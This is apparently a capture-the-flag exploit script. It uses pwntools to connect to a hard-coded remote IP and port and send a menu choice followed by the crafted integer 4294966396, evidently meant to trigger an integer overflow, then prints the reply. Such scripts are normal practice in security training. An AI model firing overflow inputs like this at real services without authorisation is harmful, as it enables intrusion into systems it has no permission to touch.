from pwn import *

# Connect to remote server
conn = remote('34.124.157.94', 10541)
conn.sendline(b'2\n')
conn.sendline(b'4294966396\n')
result = conn.recv(4096)
conn.shutdown()
print(result.decode('utf-8'))